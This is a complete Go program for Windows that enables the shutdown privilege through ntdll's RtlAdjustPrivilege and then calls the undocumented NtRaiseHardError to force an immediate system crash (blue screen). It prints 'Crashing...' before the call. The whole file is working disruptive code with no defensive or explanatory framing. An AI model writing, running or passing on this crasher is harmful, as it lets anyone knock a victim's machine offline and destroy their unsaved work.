package main

import (
    "fmt"
    "syscall"
    "unsafe"
)

var (
    modntdll = syscall.NewLazyDLL("ntdll.dll")

    procRtlAdjustPrivilege = modntdll.NewProc("RtlAdjustPrivilege")
    procNtRaiseHardError   = modntdll.NewProc("NtRaiseHardError")
)

func RtlAdjustPrivilege(privilege uint32, enable, currentThread bool, statusPointer *bool) error {
    _, _, err := procRtlAdjustPrivilege.Call(
        uintptr(privilege),
        uintptr(toBOOL(enable)),
        uintptr(toBOOL(currentThread)),
        uintptr(unsafe.Pointer(statusPointer)),
    )

    if err.Error() != "The operation completed successfully." {
        return err
    }

    return nil
}

func NtRaiseHardError(errorStatus int32, unless1, unless2 uint32, unless3 *uintptr,
                      validResponseOption uint32, responsePointer *uint32) error {
    _, _, err := procNtRaiseHardError.Call(
        uintptr(errorStatus),
        uintptr(unless1),
        uintptr(unless2),
        uintptr(unsafe.Pointer(unless3)),
        uintptr(validResponseOption),
        uintptr(unsafe.Pointer(responsePointer)),
    )

    if err.Error() != "The operation completed successfully." {
        return err
    }

    return nil
}

func main() {
    var PrivilegeState bool
    var ErrorResponse uint32

    err := RtlAdjustPrivilege(19, true, false, &PrivilegeState)
    if err != nil {
        fmt.Printf("Error adjusting privilege: %v\n", err)
        return
    }

    fmt.Println("Crashing...")
    err = NtRaiseHardError(-1073741823, 0, 0, nil, 6, &ErrorResponse)
    if err != nil {
        fmt.Printf("Error raising hard error: %v\n", err)
        return
    }

    fmt.Println("Crash failed!")
}

func toBOOL(b bool) int32 {
    if b {
        return 1
    }
    return 0
}
